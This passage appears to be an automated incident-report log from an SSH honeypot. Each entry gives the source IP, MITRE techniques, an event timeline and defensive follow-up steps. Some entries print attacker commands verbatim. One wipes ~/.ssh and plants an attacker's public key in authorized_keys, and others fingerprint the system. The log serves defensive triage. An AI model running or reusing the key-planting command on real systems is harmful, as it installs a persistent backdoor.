| `2026-07-08 17:03:24` | `cowrie.command.success` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:24` | `cowrie.command.input` |
| `2026-07-08 17:03:25` | `cowrie.log.closed` |
| `2026-07-08 17:03:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30fe7cb9b05

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-07-08 17:04 |
| **Last Seen** | 2026-07-08 17:04 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:04:30` | `cowrie.session.connect` |
| `2026-07-08 17:04:30` | `cowrie.client.version` |
| `2026-07-08 17:04:30` | `cowrie.client.kex` |
| `2026-07-08 17:04:31` | `cowrie.login.success` |
| `2026-07-08 17:04:32` | `cowrie.session.params` |
| `2026-07-08 17:04:32` | `cowrie.command.input` |
| `2026-07-08 17:04:32` | `cowrie.command.failed` |
| `2026-07-08 17:04:33` | `cowrie.log.closed` |
| `2026-07-08 17:04:34` | `cowrie.session.params` |
| `2026-07-08 17:04:34` | `cowrie.command.input` |
| `2026-07-08 17:04:34` | `cowrie.session.file_download` |
| `2026-07-08 17:04:34` | `cowrie.log.closed` |
| `2026-07-08 17:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b0b5bf7a35b

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-07-08 17:04 |
| **Last Seen** | 2026-07-08 17:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:04:39` | `cowrie.session.connect` |
| `2026-07-08 17:04:39` | `cowrie.client.version` |
| `2026-07-08 17:04:40` | `cowrie.client.kex` |
| `2026-07-08 17:04:41` | `cowrie.login.success` |
| `2026-07-08 17:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7645e5480a3

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-07-08 17:04 |
| **Last Seen** | 2026-07-08 17:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:04:46` | `cowrie.session.connect` |
| `2026-07-08 17:04:46` | `cowrie.client.version` |
| `2026-07-08 17:04:46` | `cowrie.client.kex` |
| `2026-07-08 17:04:47` | `cowrie.login.success` |
| `2026-07-08 17:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612e229aa731

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:05 |
| **Last Seen** | 2026-07-08 17:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:05:43` | `cowrie.session.connect` |
| `2026-07-08 17:05:43` | `cowrie.client.version` |
| `2026-07-08 17:05:43` | `cowrie.client.kex` |
| `2026-07-08 17:05:45` | `cowrie.login.success` |
| `2026-07-08 17:05:46` | `cowrie.session.params` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.success` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.command.input` |
| `2026-07-08 17:05:46` | `cowrie.log.closed` |
| `2026-07-08 17:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0492691fd5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:08 |
| **Last Seen** | 2026-07-08 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:08:03` | `cowrie.session.connect` |
| `2026-07-08 17:08:04` | `cowrie.client.version` |
| `2026-07-08 17:08:04` | `cowrie.client.kex` |
| `2026-07-08 17:08:05` | `cowrie.login.success` |
| `2026-07-08 17:08:06` | `cowrie.session.params` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.success` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:06` | `cowrie.command.input` |
| `2026-07-08 17:08:07` | `cowrie.log.closed` |
| `2026-07-08 17:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0bdd2a235db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:10 |
| **Last Seen** | 2026-07-08 17:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:10:28` | `cowrie.session.connect` |
| `2026-07-08 17:10:28` | `cowrie.client.version` |
| `2026-07-08 17:10:28` | `cowrie.client.kex` |
| `2026-07-08 17:10:29` | `cowrie.login.success` |
| `2026-07-08 17:10:31` | `cowrie.session.params` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.success` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.command.input` |
| `2026-07-08 17:10:31` | `cowrie.log.closed` |
| `2026-07-08 17:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc31be61b87

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:12 |
| **Last Seen** | 2026-07-08 17:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:12:46` | `cowrie.session.connect` |
| `2026-07-08 17:12:47` | `cowrie.client.version` |
| `2026-07-08 17:12:47` | `cowrie.client.kex` |
| `2026-07-08 17:12:48` | `cowrie.login.success` |
| `2026-07-08 17:12:50` | `cowrie.session.params` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.success` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:50` | `cowrie.command.input` |
| `2026-07-08 17:12:51` | `cowrie.log.closed` |
| `2026-07-08 17:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ce51cefd2e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 17:15 |
| **Last Seen** | 2026-07-08 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:15:00` | `cowrie.session.connect` |
| `2026-07-08 17:15:00` | `cowrie.client.version` |
| `2026-07-08 17:15:00` | `cowrie.client.kex` |
| `2026-07-08 17:15:00` | `cowrie.login.success` |
| `2026-07-08 17:15:01` | `cowrie.session.params` |
| `2026-07-08 17:15:01` | `cowrie.command.input` |
| `2026-07-08 17:15:01` | `cowrie.log.closed` |
| `2026-07-08 17:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ee9901bd40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:15 |
| **Last Seen** | 2026-07-08 17:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:15:04` | `cowrie.session.connect` |
| `2026-07-08 17:15:05` | `cowrie.client.version` |
| `2026-07-08 17:15:05` | `cowrie.client.kex` |
| `2026-07-08 17:15:06` | `cowrie.login.success` |
| `2026-07-08 17:15:07` | `cowrie.session.params` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.success` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:07` | `cowrie.command.input` |
| `2026-07-08 17:15:08` | `cowrie.log.closed` |
| `2026-07-08 17:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2cd9b2778e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]151` |
| **First Seen** | 2026-07-08 17:15 |
| **Last Seen** | 2026-07-08 17:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:15:07` | `cowrie.session.connect` |
| `2026-07-08 17:15:08` | `cowrie.client.version` |
| `2026-07-08 17:15:08` | `cowrie.client.kex` |
| `2026-07-08 17:15:10` | `cowrie.login.success` |
| `2026-07-08 17:15:10` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:15:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]151` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb6b7063881

| Field | Detail |
|---|---|
| **Source IP** | `117.252.93[.]114` |
| **First Seen** | 2026-07-08 17:15 |
| **Last Seen** | 2026-07-08 17:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:15:17` | `cowrie.session.connect` |
| `2026-07-08 17:15:19` | `cowrie.client.version` |
| `2026-07-08 17:15:19` | `cowrie.client.kex` |
| `2026-07-08 17:15:22` | `cowrie.login.success` |
| `2026-07-08 17:15:23` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.252.93[.]114` to AbuseIPDB if not already reported
- [ ] Block `117.252.93[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1db51fea9c7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 17:15 |
| **Last Seen** | 2026-07-08 17:15 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:15:38` | `cowrie.session.connect` |
| `2026-07-08 17:15:40` | `cowrie.client.version` |
| `2026-07-08 17:15:40` | `cowrie.client.kex` |
| `2026-07-08 17:15:44` | `cowrie.login.success` |
| `2026-07-08 17:15:48` | `cowrie.session.params` |
| `2026-07-08 17:15:48` | `cowrie.command.input` |
| `2026-07-08 17:15:50` | `cowrie.log.closed` |
| `2026-07-08 17:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d08ce99abab9

| Field | Detail |
|---|---|
| **Source IP** | `118.45.113[.]140` |
| **First Seen** | 2026-07-08 17:16 |
| **Last Seen** | 2026-07-08 17:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:16:59` | `cowrie.session.connect` |
| `2026-07-08 17:16:59` | `cowrie.client.version` |
| `2026-07-08 17:16:59` | `cowrie.client.kex` |
| `2026-07-08 17:17:02` | `cowrie.login.success` |
| `2026-07-08 17:17:03` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.113[.]140` to AbuseIPDB if not already reported
- [ ] Block `118.45.113[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0f6eed6f01

| Field | Detail |
|---|---|
| **Source IP** | `117.247.239[.]202` |
| **First Seen** | 2026-07-08 17:17 |
| **Last Seen** | 2026-07-08 17:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:17:08` | `cowrie.session.connect` |
| `2026-07-08 17:17:09` | `cowrie.client.version` |
| `2026-07-08 17:17:09` | `cowrie.client.kex` |
| `2026-07-08 17:17:11` | `cowrie.login.success` |
| `2026-07-08 17:17:12` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.239[.]202` to AbuseIPDB if not already reported
- [ ] Block `117.247.239[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e106de625d45

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:17 |
| **Last Seen** | 2026-07-08 17:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:17:24` | `cowrie.session.connect` |
| `2026-07-08 17:17:24` | `cowrie.client.version` |
| `2026-07-08 17:17:24` | `cowrie.client.kex` |
| `2026-07-08 17:17:26` | `cowrie.login.success` |
| `2026-07-08 17:17:27` | `cowrie.session.params` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.success` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:27` | `cowrie.command.input` |
| `2026-07-08 17:17:28` | `cowrie.log.closed` |
| `2026-07-08 17:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0825e7479b

| Field | Detail |
|---|---|
| **Source IP** | `180.117.39[.]49` |
| **First Seen** | 2026-07-08 17:17 |
| **Last Seen** | 2026-07-08 17:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:17:28` | `cowrie.session.connect` |
| `2026-07-08 17:17:29` | `cowrie.client.version` |
| `2026-07-08 17:17:29` | `cowrie.client.kex` |
| `2026-07-08 17:17:33` | `cowrie.login.success` |
| `2026-07-08 17:17:34` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.117.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `180.117.39[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2871fe12e3c

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-07-08 17:17 |
| **Last Seen** | 2026-07-08 17:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:17:40` | `cowrie.session.connect` |
| `2026-07-08 17:17:41` | `cowrie.client.version` |
| `2026-07-08 17:17:41` | `cowrie.client.kex` |
| `2026-07-08 17:17:43` | `cowrie.login.success` |
| `2026-07-08 17:17:43` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a6ebc439c6e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:19 |
| **Last Seen** | 2026-07-08 17:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
